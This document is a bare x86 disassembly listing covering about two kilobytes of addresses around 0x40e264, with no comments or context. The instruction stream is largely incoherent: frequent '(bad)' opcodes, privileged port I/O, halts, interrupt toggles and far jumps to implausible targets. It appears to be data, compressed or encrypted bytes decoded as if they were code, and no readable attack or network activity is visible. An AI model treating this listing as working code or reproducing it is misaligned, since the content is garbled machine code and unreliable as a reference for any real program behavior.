  40e264:	mov    esp,0xdefedaba
  40e269:	stc    
  40e26a:	mov    ebp,0xc2ffe006
  40e26f:	add    eax,ebx
  40e271:	jmp    0xdd0b:0x2dfcae7
  40e278:	loope  0x40e258
  40e27a:	in     al,0xce
  40e27c:	loope  0x40e259
  40e27e:	sti    
  40e27f:	out    dx,al
  40e280:	int3   
  40e281:	mov    ch,0xcb
  40e283:	jmp    0x40e264
  40e285:	(bad)  
  40e287:	cmc    
  40e288:	in     eax,dx
  40e289:	loope  0x40e284
  40e28b:	push   es
  40e28c:	ret    
  40e28d:	jecxz  0x40e279
  40e28f:	ret    0xec9
  40e292:	add    edi,edx
  40e294:	leave  
  40e295:	fldlg2 
  40e297:	(bad)
  40e29a:	shr    BYTE PTR [edi-0x27391e3a],0xe6
  40e2a1:	iret   
  40e2a2:	shl    DWORD PTR [edx+esi*4-0x222a2b21],1
  40e2a9:	inc    BYTE PTR [ecx]
  40e2ab:	(bad)  
  40e2ac:	add    ch,bl
  40e2ae:	or     ecx,ebx
  40e2b0:	pop    es
  40e2b1:	enter  0xe709,0x6
  40e2b5:	add    ch,cl
  40e2b7:	test   eax,0xd2c4e4dd
  40e2bc:	cmc    
  40e2bd:	lock retf 
  40e2bf:	hlt    
  40e2c0:	(bad)  
  40e2c1:	mov    ah,0xd1
  40e2c3:	mov    esi,0xc2d9cab2
  40e2c8:	(bad)  
  40e2c9:	lock rcr ecx,1
  40e2cc:	in     al,0xd4
  40e2ce:	xlat   BYTE PTR ds:[ebx]
  40e2cf:	in     al,0xea
  40e2d1:	sti    
  40e2d2:	(bad)  
  40e2d3:	into   
  40e2d4:	aam    0x1
  40e2d6:	repnz rol bl,cl
  40e2d9:	mov    al,0xb1
  40e2db:	aad    0xe3
  40e2dd:	in     al,0xe4
  40e2df:	mov    bh,0xb0
  40e2e1:	in     al,0xf0
  40e2e3:	retf   0xd0f3
  40e2e6:	in     eax,dx
  40e2e7:	in     al,dx
  40e2e8:	sti    
  40e2e9:	int    0xf1
  40e2eb:	push   es
  40e2ec:	cli    
  40e2ed:	mov    ecx,0xf6d6c1c7
  40e2f2:	or     eax,edi
  40e2f4:	adc    eax,DWORD PTR [ecx]
  40e2f6:	leave  
  40e2f7:	jmp    0xc2efb2cb
  40e2fc:	loop   0x40e2e7
  40e2fe:	rcl    ch,1
  40e300:	out    dx,al
  40e301:	cli    
  40e302:	cli    
  40e303:	jmp    0x40e2ff
  40e305:	fldlg2 
  40e307:	add    ebx,ecx
  40e309:	in     eax,dx
  40e30a:	ret    
  40e30b:	int    0xb
  40e30d:	sti    
  40e30e:	std    
  40e30f:	cli    
  40e310:	or     dh,bh
  40e312:	loopne 0x40e2d7
  40e314:	add    cl,ch
  40e316:	push   cs
  40e317:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e318:	jecxz  0x40e2ca
  40e31a:	(bad)  
  40e31b:	cmc    
  40e31c:	mov    ah,0xda
  40e31e:	sar    BYTE PTR [edx-0x482a0825],1
  40e324:	fucomip st,st(6)
  40e326:	out    dx,eax
  40e327:	mov    edi,0xbbdcbfc0
  40e32c:	in     eax,0x6
  40e32e:	icebp  
  40e32f:	stc    
  40e330:	std    
  40e331:	mov    ebp,0xe5de0ad9
  40e336:	add    dl,cl
  40e338:	retf   0xdecf
  40e33b:	test   esp,0xe6b4b7e6
  40e341:	mov    dh,0xe9
  40e343:	mov    eax,0xdaddf2dc
  40e348:	add    ebx,ecx
  40e34a:	(bad)  
  40e34c:	mov    edx,0xeae409f7
  40e351:	loope  0x40e339
  40e353:	jmp    0xe5cd:0xe7f2faed
  40e35a:	fucomp st(3)
  40e35c:	call   0xfc229e23
  40e361:	mov    cl,0xcf
  40e363:	stc    
  40e364:	mov    esp,0x1de01d3
  40e369:	rol    BYTE PTR ds:0xddfaf9c7,1
  40e36f:	add    esp,edi
  40e371:	std    
  40e372:	loop   0x40e369
  40e374:	loopne 0x40e359
  40e376:	loop   0x40e348
  40e378:	out    dx,al
  40e379:	repnz mov al,0xe5
  40e37c:	loopne 0x40e364
  40e37e:	int    0xd9
  40e380:	mov    ecx,0x3d1c6bb
  40e385:	mov    edx,0x7c801bc
  40e38a:	int    0xe6
  40e38c:	icebp  
  40e38d:	rcl    dl,1
  40e38f:	or     bl,bl
  40e391:	hlt    
  40e392:	dec    DWORD PTR [ecx*1-0x410d20f7]
  40e399:	mov    esp,0xf7ecb3c8
  40e39e:	cmc    
  40e39f:	iret   
  40e3a0:	stc    
  40e3a1:	(bad)  
  40e3a2:	(bad)  
  40e3a3:	mov    edi,0xddf0baeb
  40e3a8:	iret   
  40e3a9:	xlat   BYTE PTR ds:[ebx]
  40e3aa:	in     eax,dx
  40e3ab:	add    eax,0xf1c7c4d6
  40e3b0:	jmp    0x9ed:0xeb07fe0e
  40e3b7:	scas   eax,DWORD PTR es:[edi]
  40e3b8:	retf   0xa4c4
  40e3bb:	lds    ebp,FWORD PTR [esi-0x240d3a09]
  40e3c1:	fidivr DWORD PTR [edi-0x22093713]
  40e3c7:	std    
  40e3c8:	fcomi  st,st(7)
  40e3ca:	fidivr DWORD PTR [ebp-0x1bf60f3f]
  40e3d0:	neg    bh
  40e3d2:	jecxz  0x40e3d4
  40e3d4:	repz in eax,0x1
  40e3d7:	retf   0xd1c6
  40e3da:	jmp    0x40e3be
  40e3dc:	aad    0xe8
  40e3de:	mov    edx,0xced0e0b9
  40e3e3:	mov    dh,0xd6
  40e3e5:	idiv   cl
  40e3e7:	fnstsw WORD PTR [esi-0x260a2d2c]
  40e3ed:	cld    
  40e3ee:	cli    
  40e3ef:	out    0xd7,al
  40e3f1:	add    dh,ah
  40e3f3:	hlt    
  40e3f4:	call   0xca0ce9c8
  40e3f9:	in     eax,0xc0
  40e3fb:	ret    
  40e3fc:	(bad)  
  40e3fd:	leave  
  40e3fe:	in     eax,dx
  40e3ff:	fcmovnbe st,st(3)
  40e401:	out    0xd9,eax
  40e403:	fcmovbe st,st(7)
  40e405:	idiv   DWORD PTR [ecx-0x29241144]
  40e40b:	int    0xf8
  40e40d:	pop    es
  40e40e:	add    al,bh
  40e410:	in     eax,0x6
  40e412:	into   
  40e413:	retf   0xe3e9
  40e416:	in     al,0xae
  40e418:	ret    0xe1bc
  40e41b:	retf   0xcdc9
  40e41e:	iret   
  40e41f:	stc    
  40e420:	(bad)  
  40e422:	(bad)  
  40e424:	(bad)  
  40e426:	clc    
  40e427:	repnz (bad) 
  40e42a:	in     eax,dx
  40e42b:	sar    BYTE PTR [edx-0xafa2e0f],1
  40e431:	xlat   BYTE PTR ds:[ebx]
  40e432:	loope  0x40e3f9
  40e434:	jmp    0xb1d6:0xe3c40eed
  40e43b:	mov    dl,0xc4
  40e43d:	(bad)  
  40e43e:	rol    esp,cl
  40e440:	mov    cl,0xd0
  40e442:	mov    al,0xd1
  40e444:	retf   0xe3cb
  40e447:	(bad)  
  40e448:	icebp  
  40e449:	mov    esp,0xd5d8d3e0
  40e44e:	repnz clc 
  40e450:	jecxz  0x40e40f
  40e452:	cmc    
  40e453:	loop   0x40e436
  40e455:	fsub   st(6),st
  40e457:	retf   
  40e458:	(bad)  
  40e45a:	shl    DWORD PTR [ecx-0x14291633],cl
  40e460:	in     eax,dx
  40e461:	in     eax,dx
  40e462:	(bad)  
  40e463:	in     al,dx
  40e464:	mov    esp,0xb600b9ff
  40e469:	mov    eax,0xe4e102f5
  40e46e:	rol    ch,0x3
  40e471:	fsubr  st(4),st
  40e473:	out    dx,al
  40e474:	call   0xe0eac87b
  40e479:	out    dx,eax
  40e47a:	icebp  
  40e47b:	repnz into 
  40e47d:	repnz xlat BYTE PTR ds:[ebx]
  40e47f:	(bad)  
  40e480:	stc    
  40e481:	into   
  40e482:	call   0xda0e9b66
  40e487:	inc    BYTE PTR [ecx]
  40e489:	shl    ebx,cl
  40e48b:	vpavgw ymm4,ymm4,ymm0
  40e48f:	loop   0x40e471
  40e491:	leave  
  40e492:	std    
  40e493:	fld    QWORD PTR [edi]
  40e495:	push   es
  40e496:	or     al,0xe6
  40e498:	fdiv   st,st(2)
  40e49a:	ret    
  40e49b:	ret    
  40e49c:	shr    cl,1
  40e49e:	idiv   DWORD PTR [edx-0x23a2a26]
  40e4a4:	(bad)  
  40e4a6:	int    0x3
  40e4a8:	mov    esi,0xe5dfc1ee
  40e4ad:	ret    0xcbe1
  40e4b0:	push   es
  40e4b1:	in     al,0xee
  40e4b3:	loop   0x40e492
  40e4b5:	pmaxsw mm5,mm0
  40e4b8:	jmp    0xf5b7:0xc6b5e9f2
  40e4bf:	leave  
  40e4c0:	shr    bh,1
  40e4c2:	jmp    0x2f8:0xdbf6edcb
  40e4c9:	idiv   esi
  40e4cb:	in     al,dx
  40e4cc:	inc    ch
  40e4ce:	(bad)  
  40e4cf:	clc    
  40e4d0:	add    dh,dh
  40e4d2:	jmp    eax
  40e4d4:	out    0xf2,al
  40e4d6:	add    ah,ch
  40e4d8:	enter  0xefbe,0xe4
  40e4dc:	hlt    
  40e4dd:	out    0xca,eax
  40e4df:	iret   
  40e4e0:	(bad)  
  40e4e1:	cli    
  40e4e2:	iret   
  40e4e3:	fcomip st,st(7)
  40e4e5:	jecxz  0x40e4e5
  40e4e7:	hlt    
  40e4e8:	mov    ecx,0xbedc06f3
  40e4ed:	div    al
  40e4ef:	(bad)  
  40e4f0:	cld    
  40e4f1:	(bad)  
  40e4f2:	or     BYTE PTR [esi],al
  40e4f4:	add    al,ah
  40e4f6:	add    eax,0xc2d1c5d2
  40e4fb:	jmp    0xf9ed:0xaff0b4c3
  40e502:	cli    
  40e503:	lock jmp edx
  40e506:	fsub   st,st(0)
  40e508:	loopne 0x40e4e9
  40e50a:	mov    ebx,0xf7e6fbdc
  40e510:	lock fyl2xp1 
  40e513:	jmp    0xf1e4:0xc0c0ccdc
  40e51a:	out    dx,al
  40e51b:	aad    0xcc
  40e51d:	jmp    0xeabe:0xd6f0c8ea
  40e524:	in     al,dx
  40e525:	mov    ebp,0xdb03cfea
  40e52a:	ret    
  40e52b:	ret    0xd1d5
  40e52e:	fdivr  QWORD PTR [edi+0x1ddd9d8]
  40e534:	loopne 0x40e540
  40e536:	in     al,dx
  40e537:	icebp  
  40e538:	leave  
  40e539:	(bad)  
  40e53a:	out    dx,al
  40e53b:	aam    0xd3
  40e53d:	out    dx,al
  40e53e:	mov    cl,0xdb
  40e540:	shr    ah,0xef
  40e543:	jmp    0x40e523
  40e545:	(bad)  
  40e546:	mov    al,0xd0
  40e548:	repz fdiv st,st(7)
  40e54b:	ret    0xdfc7
  40e54e:	ret    
  40e54f:	jmp    0x40e54b
  40e551:	out    0x6,eax
  40e553:	std    
  40e554:	out    0x13,eax
  40e556:	fcomp  st(1)
  40e558:	enter  0xebd1,0xbd
  40e55c:	repz test eax,0xf4f2d8cc
  40e562:	mov    esi,0xd7cbb6b5
  40e567:	shl    bl,1
  40e569:	aam    0xe6
  40e56b:	mov    esi,0x7fcd4db
  40e570:	(bad)  
  40e572:	retf   0x1c7
  40e575:	repnz or BYTE PTR [ebx-0x2b41212d],ch
  40e57c:	out    0xcf,al
  40e57e:	in     al,dx
  40e57f:	fsubr  st,st(1)
  40e581:	push   DWORD PTR [eax-0x47470718]
  40e587:	rol    BYTE PTR [edi],cl
  40e589:	(bad)  
  40e58a:	mov    ah,0xd6
  40e58c:	(bad)  
  40e58d:	mov    ecx,0xd8c6fc01
  40e592:	fadd   st(7),st
  40e594:	out    dx,al
  40e595:	leave  
  40e596:	std    
  40e597:	icebp  
  40e598:	jmp    0xc7f2cc67
  40e59d:	iret   
  40e59e:	mov    bh,0xe9
  40e5a0:	retf   0xf4b0
  40e5a3:	mov    bl,0xf7
  40e5a5:	div    bl
  40e5a7:	out    dx,al
  40e5a8:	fistp  QWORD PTR [edi-0x38392a06]
  40e5ae:	clc    
  40e5af:	add    eax,edi
  40e5b1:	test   DWORD PTR [ecx],0xcc090bf4
  40e5b7:	fadd   st(0),st
  40e5b9:	lods   al,BYTE PTR ds:[esi]
  40e5ba:	loope  0x40e584
  40e5bc:	fcomi  st,st(3)
  40e5be:	out    dx,al
  40e5bf:	mov    cl,0xcf
  40e5c1:	aad    0xd3
  40e5c3:	div    eax
  40e5c5:	int    0xe1
  40e5c7:	repnz mov edi,0x5edc0
  40e5cd:	retf   
  40e5ce:	ret    
  40e5cf:	xlat   BYTE PTR ds:[ebx]
  40e5d0:	add    eax,eax
  40e5d2:	leave  
  40e5d3:	loop   0x40e59f
  40e5d5:	out    0xde,al
  40e5d7:	ret    
  40e5d8:	shl    DWORD PTR [ebp-0x1338333e],cl
  40e5de:	call   0xcd09daca
  40e5e3:	clc    
  40e5e4:	sti    
  40e5e5:	(bad)  
  40e5e7:	fcompp 
  40e5e9:	loopne 0x40e5d0
  40e5eb:	neg    eax
  40e5ed:	add    al,0x7
  40e5ef:	neg    ebx
  40e5f1:	out    0x8,eax
  40e5f3:	add    bh,ah
  40e5f5:	into   
  40e5f6:	add    dh,al
  40e5f8:	int3   
  40e5f9:	repnz rol ch,cl
  40e5fc:	into   
  40e5fd:	aad    0xf3
  40e5ff:	(bad)  
  40e600:	out    dx,eax
  40e601:	mov    ch,0xf2
  40e603:	mov    ch,0xee
  40e605:	rcl    esi,cl
  40e607:	cli    
  40e608:	iret   
  40e609:	add    dh,bl
  40e60b:	int    0xff
  40e60d:	add    eax,eax
  40e60f:	or     al,al
  40e611:	stc    
  40e612:	loope  0x40e5d7
  40e614:	or     edx,esi
  40e616:	fisubr DWORD PTR [edx+esi*4-0x4b234d3b]
  40e61d:	shr    dl,1
  40e61f:	shr    DWORD PTR [esi-0x1632002d],1
  40e625:	jmp    0x40e5f9
  40e627:	add    edi,esi
  40e629:	fidiv  DWORD PTR [ebp+ecx*8-0x291d0a02]
  40e630:	(bad)  
  40e631:	neg    al
  40e633:	add    al,0xf3
  40e635:	jmp    0xe7eda036
  40e63a:	shl    esi,1
  40e63c:	jecxz  0x40e61f
  40e63e:	mov    cl,0xb3
  40e640:	mov    cl,0xcc
  40e642:	jmp    0xf6ffd745
  40e647:	enter  0xdecd,0xf0
  40e64b:	mov    esp,0xc2f1dafd
  40e650:	add    ebx,edi
  40e652:	fld    DWORD PTR [esi]
  40e654:	fisttp QWORD PTR [ebx]
  40e656:	int    0xca
  40e658:	fsubr  DWORD PTR [edi+ecx*8-0x17563d31]
  40e65f:	repnz in al,dx
  40e661:	iret   
  40e662:	cli    
  40e663:	repnz hlt 
  40e665:	mov    edi,0x102e2f2
  40e66a:	mov    eax,0xdbfcdddf
  40e66f:	cli    
  40e670:	fadd   DWORD PTR [esi]
  40e672:	fimul  DWORD PTR [eax]
  40e674:	in     al,0x2
  40e676:	fadd   st,st(7)
  40e678:	xlat   BYTE PTR ds:[ebx]
  40e679:	test   eax,0xf4c8eabe
  40e67e:	retf   0xcbb6
  40e681:	(bad)  
  40e682:	repz icebp 
  40e684:	fidiv  WORD PTR [ebp+esi*8-0x422c2b1e]
  40e68b:	add    eax,0xeac3b901
  40e690:	std    
  40e691:	pop    es
  40e692:	or     edi,esi
  40e694:	pop    es
  40e695:	std    
  40e696:	add    esp,DWORD PTR [edi-0x3f232d50]
  40e69c:	shr    ebx,1
  40e69e:	shl    bh,0xc7
  40e6a1:	lods   eax,DWORD PTR ds:[esi]
  40e6a2:	lods   al,BYTE PTR ds:[esi]
  40e6a3:	stc    
  40e6a4:	mov    eax,0xb6d6cefb
  40e6a9:	in     eax,dx
  40e6aa:	mov    eax,0xf2eaf2c5
  40e6af:	or     ah,bl
  40e6b1:	loope  0x40e688
  40e6b3:	out    dx,al
  40e6b4:	out    dx,eax
  40e6b5:	loope  0x40e6a0
  40e6b7:	retf   0xe3dd
  40e6ba:	(bad)  
  40e6bb:	hlt    
  40e6bc:	retf   0xe9d2
  40e6bf:	test   ebx,0xd8b6acd8
  40e6c5:	fyl2x  
  40e6c7:	aam    0xf6
  40e6c9:	cld    
  40e6ca:	loope  0x40e6a3
  40e6cc:	fadd   DWORD PTR [esi]
  40e6ce:	retf   
  40e6cf:	(bad)  
  40e6d0:	(bad)  
  40e6d1:	or     dl,ah
  40e6d3:	cmc    
  40e6d4:	aam    0xc9
  40e6d6:	push   cs
  40e6d7:	out    dx,al
  40e6d8:	ret    
  40e6d9:	imul   bl
  40e6db:	stos   DWORD PTR es:[edi],eax
  40e6dc:	mov    al,0xce
  40e6de:	mov    cl,0xd2
  40e6e0:	aad    0xf7
  40e6e2:	(bad)
  40e6e5:	in     al,dx
  40e6e6:	xlat   BYTE PTR ds:[ebx]
  40e6e7:	mov    ebx,0xd0f4bedb
  40e6ec:	(bad)  
  40e6ee:	aam    0xda
  40e6f0:	or     al,BYTE PTR ds:0xede7dcc9
  40e6f6:	add    ch,BYTE PTR [eax-0x5457100f]
  40e6fc:	rol    ah,1
  40e6fe:	stc    
  40e6ff:	ror    bl,1
  40e701:	div    DWORD PTR [esi-0x43c3246]
  40e707:	jecxz  0x40e704
  40e709:	loopne 0x40e708
  40e70b:	cld    
  40e70c:	fadd   QWORD PTR [edi]
  40e70e:	lock add eax,0x8dae2e0
  40e714:	bswap  esi
  40e716:	fidiv  DWORD PTR [ebx-0x1b1e121f]
  40e71c:	loop   0x40e6ce
  40e71e:	lods   al,BYTE PTR ds:[esi]
  40e71f:	cmc    
  40e720:	out    0xe5,al
  40e722:	fucomip st,st(3)
  40e724:	mov    edx,0xd1fb02ff
  40e729:	ror    ah,cl
  40e72b:	push   es
  40e72c:	cld    
  40e72d:	jecxz  0x40e713
  40e72f:	cli    
  40e730:	fcmovu st,st(6)
  40e732:	out    dx,al
  40e733:	enter  0xfde2,0xe8
  40e737:	loop   0x40e71c
  40e739:	test   eax,0xcfb7c0d2
  40e73e:	out    0xeb,al
  40e740:	fnstenv [ebp-0x113b2d2b]
  40e746:	add    edx,edi
  40e748:	out    0xfa,eax
  40e74a:	int    0xc5
  40e74c:	out    0xf0,eax
  40e74e:	add    eax,0xc9f8dbc5
  40e753:	(bad)  
  40e754:	(bad)  
  40e756:	iret   
  40e757:	loopne 0x40e72c
  40e759:	(bad)  
  40e75a:	mov    esp,0xcceab3c0
  40e75f:	repnz cli 
  40e761:	(bad)  
  40e762:	call   0xb920a246
  40e767:	lock div ebp
  40e76a:	int3   
  40e76b:	out    0xe1,al
  40e76d:	(bad)  
  40e76f:	aad    0xd8
  40e771:	add    BYTE PTR [ecx],cl
  40e773:	add    al,0xc9
  40e775:	add    BYTE PTR [edx],cl
  40e777:	int    0xbd
  40e779:	ret    0xe1b1
  40e77c:	fsub   st(5),st
  40e77e:	retf   0xf7eb
  40e781:	in     al,0xfa
  40e783:	out    dx,al
  40e784:	fucomip st,st(4)
  40e786:	dec    cl
  40e788:	out    dx,al
  40e789:	sar    esi,0xfa
  40e78c:	jmp    edi
  40e78e:	add    al,0xc1
  40e790:	out    0xc5,al
  40e792:	mov    ebp,0xde070804
  40e798:	iret   
  40e799:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e79a:	loopne 0x40e793
  40e79c:	ror    esi,cl
  40e79e:	call   0xf325cf83
  40e7a3:	mov    edx,0xdbf1dbe4
  40e7a8:	out    dx,al
  40e7a9:	int3   
  40e7aa:	fld    QWORD PTR [ecx]
  40e7ac:	(bad)  
  40e7ae:	sar    bl,cl
  40e7b0:	cld    
  40e7b1:	rol    eax,0xca
  40e7b4:	or     al,0x13
  40e7b6:	(bad)  
  40e7b8:	les    edi,FWORD PTR [edi-0x293f1b4a]
  40e7be:	sar    BYTE PTR [ebx-0x154f0d2f],cl
  40e7c4:	mov    ecx,0xfad1d4b8
  40e7c9:	(bad)  
  40e7cb:	(bad)  
  40e7cc:	fcomp  st(7)
  40e7ce:	pop    es
  40e7cf:	fld    st(6)
  40e7d1:	out    dx,eax
  40e7d2:	(bad)  [edi]
  40e7d4:	out    0xdd,eax
  40e7d6:	add    esi,edx
  40e7d8:	mov    al,0xec
  40e7da:	test   cl,0xb6
  40e7dd:	jmp    0xe517d6cc
  40e7e2:	mov    al,0xfb
  40e7e4:	mov    ebp,0xcdd6eece
  40e7e9:	repz out 0xd6,al
  40e7ec:	lock cli 
  40e7ee:	rcr    al,0xfd
  40e7f1:	fild   DWORD PTR [edx]
  40e7f3:	hlt    
  40e7f4:	(bad)  
  40e7f5:	int    0xf8
  40e7f7:	stos   BYTE PTR es:[edi],al
  40e7f8:	(bad)  
  40e7f9:	mov    cl,0xb6
  40e7fb:	mov    ch,0xec
  40e7fd:	sar    bl,1
  40e7ff:	repnz cmc 
  40e801:	shr    ch,cl
  40e803:	leave  
  40e804:	fucomi st,st(4)
  40e806:	mov    edx,0xd3d2f4e0
  40e80b:	(bad)  
  40e80c:	(bad)  
  40e80e:	(bad)  
  40e80f:	jmp    0xe5f9:0xff9e4e2
  40e816:	in     eax,dx
  40e817:	into   
  40e818:	int3   
  40e819:	(bad)
  40e81c:	in     al,dx
  40e81d:	enter  0xe8c6,0xd1
  40e821:	out    dx,al
  40e822:	(bad)  
  40e824:	jmp    0xf6c7:0xd7e0d7ba
  40e82b:	in     al,dx
  40e82c:	(bad)  
  40e82d:	mov    ebp,0xe9020ac1
  40e832:	or     eax,0xd9e808ca
  40e837:	shl    bh,cl
  40e839:	loope  0x40e81d
  40e83b:	aad    0xb4
  40e83d:	vpsrlq ymm6,ymm5,xmm3
  40e841:	clc    
  40e842:	mov    eax,0xc9f5e4b8
  40e847:	(bad)  
  40e849:	loopne 0x40e81e
  40e84b:	(bad)  
  40e84c:	shl    edx,cl
  40e84e:	fsub   st,st(2)
  40e850:	pop    es
  40e851:	stc    
  40e852:	out    0x7,eax
  40e854:	(bad)  
  40e856:	in     eax,dx
  40e857:	mov    edi,0xc6c1e3ae
  40e85c:	mov    bl,0xc2
  40e85e:	cli    
  40e85f:	out    dx,al
  40e860:	cli    
  40e861:	(bad)  
  40e863:	idiv   ecx
  40e865:	add    dl,dh
  40e867:	mov    bh,0xbf
  40e869:	iret   
  40e86a:	add    eax,DWORD PTR [esp+edi*4]
  40e86d:	lock fcmovnu st,st(2)
  40e870:	fsubp  st(3),st
  40e872:	add    ecx,DWORD PTR [edi+ecx*1]
  40e875:	retf   0xb903
  40e878:	sar    DWORD PTR [edi-0x1b144c09],1
  40e87e:	mov    ah,0xce
  40e880:	out    0xe7,al
  40e882:	fdivr  DWORD PTR [ebx-0x21420124]
  40e888:	rol    edx,cl
  40e88a:	mov    eax,0xfb03e7f5
  40e88f:	(bad)  
  40e890:	sti    
  40e891:	cli    
  40e892:	in     eax,dx
  40e893:	sti    
  40e894:	loopne 0x40e860
  40e896:	int    0xd9
  40e898:	mov    edi,0xc8c6e6b0
  40e89d:	out    dx,al
  40e89e:	mov    bl,0xe9
  40e8a0:	call   0xda2eb477
  40e8a5:	ret    
  40e8a6:	frndint 
  40e8a8:	mov    edi,0xddbfe1
  40e8ad:	push   es
  40e8ae:	in     eax,0xc4
  40e8b0:	out    0xcb,al
  40e8b2:	(bad)  
  40e8b3:	out    dx,eax
  40e8b4:	in     al,dx
  40e8b5:	int    0xfc
  40e8b7:	out    dx,eax
  40e8b8:	repnz shl DWORD PTR [ecx-0x37441914],cl
  40e8bf:	clc    
  40e8c0:	clc    
  40e8c1:	rcl    bh,cl
  40e8c3:	out    dx,eax
  40e8c4:	fyl2xp1 
  40e8c6:	jmp    0xc0fde4a5
  40e8cb:	ffreep st(1)
  40e8cd:	test   bl,0xdc
  40e8d0:	pop    es
  40e8d1:	test   ebp,0x7e703e0
  40e8d7:	out    dx,al
  40e8d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e8d9:	scas   eax,DWORD PTR es:[edi]
  40e8da:	lock retf 
  40e8dc:	mov    cl,0xc2
  40e8de:	in     al,0xb5
  40e8e0:	out    dx,al
  40e8e1:	out    0xf4,al
  40e8e3:	mov    edx,0xcfeff0cc
  40e8e8:	out    0xf6,eax
  40e8ea:	int    0xf4
  40e8ec:	shl    ebx,1
  40e8ee:	add    eax,DWORD PTR [eax]
  40e8f0:	add    eax,ebx
  40e8f2:	loope  0x40e903
  40e8f4:	loope  0x40e902
  40e8f6:	leave  
  40e8f7:	ret    
  40e8f8:	into   
  40e8f9:	fnsave [esi-0x2e191155]
  40e8ff:	not    ecx
  40e901:	lods   eax,DWORD PTR ds:[esi]
  40e902:	mov    edx,0xe3f2fedb
  40e907:	mov    ebp,0xeec2ff
  40e90c:	rol    DWORD PTR [ebx],cl
  40e90e:	test   cl,0xbe
  40e911:	fcmovnu st,st(3)
  40e913:	cmc    
  40e914:	stc    
  40e915:	adc    cl,BYTE PTR [esp+eiz*8]
  40e918:	xlat   BYTE PTR ds:[ebx]
  40e919:	loope  0x40e8f0
  40e91b:	imul   ebp
  40e91d:	mov    ebx,0xf9b2b3ed
  40e922:	enter  0xf1f2,0xf6
  40e926:	aam    0xf9
  40e928:	add    esi,ebx
  40e92a:	loopne 0x40e903
  40e92c:	mov    esp,0xe8d900c0
  40e931:	out    0x3,eax
  40e933:	cli    
  40e934:	clc    
  40e935:	out    dx,eax
  40e936:	fdiv   QWORD PTR [ebx-0x334c2e0d]
  40e93c:	shr    esi,0xd7
  40e93f:	(bad)  
  40e940:	out    dx,al
  40e941:	mov    ch,0xf3
  40e943:	imul   al
  40e945:	sti    
  40e946:	jmp    eax
  40e948:	aad    0xda
  40e94a:	int3   
  40e94b:	sar    BYTE PTR [esi-0x1501ff1b],cl
  40e951:	(bad)  
  40e953:	or     dh,ch
  40e955:	out    0xff,al
  40e957:	stos   BYTE PTR es:[edi],al
  40e958:	shl    eax,1
  40e95a:	enter  0xfbe9,0xcc
  40e95e:	(bad)
  40e961:	clc    
  40e962:	push   DWORD PTR [ebp-0x28270927]
  40e968:	cld    
  40e969:	(bad)  
  40e96a:	(bad)  
  40e96c:	in     al,dx
  40e96d:	cli    
  40e96e:	dec    dl
  40e970:	cld    
  40e971:	sti    
  40e972:	(bad)  
  40e973:	or     al,0xff
  40e975:	push   cs
  40e976:	in     al,dx
  40e977:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e978:	icebp  
  40e979:	in     eax,dx
  40e97a:	mov    ebp,0xe9c7e0f7
  40e97f:	rol    dh,1
  40e981:	out    dx,al
  40e982:	f2xm1  
  40e984:	aad    0xd3
  40e986:	int3   
  40e987:	cli    
  40e988:	out    dx,eax
  40e989:	xlat   BYTE PTR ds:[ebx]
  40e98a:	int3   
  40e98b:	xlat   BYTE PTR ds:[ebx]
  40e98c:	(bad)  
  40e98e:	cld    
  40e98f:	sti    
  40e990:	out    dx,eax
  40e991:	or     dl,bh
  40e993:	out    dx,eax
  40e994:	or     eax,0xacbfcb07
  40e999:	lods   al,BYTE PTR ds:[esi]
  40e99a:	shr    DWORD PTR [edi+eiz*8-0x2c26152b],cl
  40e9a1:	cmc    
  40e9a2:	call   0xd9f2d360
  40e9a7:	int    0xbc
  40e9a9:	aam    0xd7
  40e9ab:	fcos   
  40e9ad:	loopne 0x40e9ad
  40e9af:	ret    0xeacb
  40e9b2:	push   cs
  40e9b3:	add    bh,bh
  40e9b5:	in     al,0xff
  40e9b7:	in     eax,0xb2
  40e9b9:	(bad)  
  40e9ba:	fmul   st(4),st
  40e9bc:	out    dx,eax
  40e9bd:	mov    cl,0xf6
  40e9bf:	(bad)  
  40e9c0:	ftst   
  40e9c2:	mov    edx,0xeff4eed3
  40e9c7:	leave  
  40e9c8:	hlt    
  40e9c9:	iret   
  40e9ca:	pop    es
  40e9cb:	in     al,0xc1
  40e9cd:	jmp    0x40e9d1
  40e9cf:	inc    DWORD PTR [ecx]
  40e9d1:	loopne 0x40e99a
  40e9d3:	ret    
  40e9d4:	in     al,0xcc
  40e9d6:	clc    
  40e9d7:	shl    edx,1
  40e9d9:	enter  0xe5d1,0xbc
  40e9dd:	cmc    
  40e9de:	enter  0xd5ea,0xf1
  40e9e2:	out    dx,al
  40e9e3:	retf   
  40e9e4:	mov    ah,0xe8
  40e9e6:	(bad)  
  40e9e8:	fldz   
  40e9ea:	mov    ebp,0xead9c3d8
  40e9ef:	(bad)  
  40e9f0:	call   0xf419b1ba
  40e9f5:	fadd   DWORD PTR [ebx]
  40e9f7:	repz in al,0xef
  40e9fa:	jecxz  0x40e9c7
  40e9fc:	sti    
  40e9fd:	(bad)
  40ea00:	sar    bh,1
  40ea02:	mov    al,0xbe
  40ea04:	mov    ebx,0xfdf2ecbf
  40ea09:	rcr    al,0x2
  40ea0c:	(bad)  
  40ea0d:	jmp    0x40e9f8
  40ea0f:	sti    
  40ea10:	cmc    
  40ea11:	(bad)  
  40ea12:	fcmovb st,st(5)
  40ea14:	in     eax,0xf2
  40ea16:	jecxz  0x40e9e9
  40ea18:	loope  0x40ea0c
  40ea1a:	loope  0x40e9dc
  40ea1c:	(bad)  
  40ea1d:	mov    bl,0xcf
  40ea1f:	retf   
  40ea20:	jmp    0xd4b5:0xd7f4d5d1
  40ea27:	int    0xfe
  40ea29:	repz fdivr st,st(5)
  40ea2c:	(bad)  
  40ea2e:	loopne 0x40ea25
  40ea30:	loope  0x40ea33
  40ea32:	add    al,bh
  40ea34:	add    BYTE PTR [ecx+ecx*8],cl
  40ea37:	repnz repz ror bh,0xcd
  40ea3c:	repz mov al,0xe8
  40ea3f:	(bad)  
  40ea41:	aad    0xcf
  40ea43:	out    dx,al
  40ea44:	std    
  40ea45:	add    edi,DWORD PTR [eax-0x1f222911]
  40ea4b:	shl    dl,0xd4
  40ea4e:	out    0xc6,al
  40ea50:	hlt    
  40ea51:	iret   
  40ea52:	cli    
  40ea53:	add    BYTE PTR [ebx],cl
  40ea55:	out    0xd3,eax
  40ea57:	ret    0xb7a8
  40ea5a:	rol    bh,cl
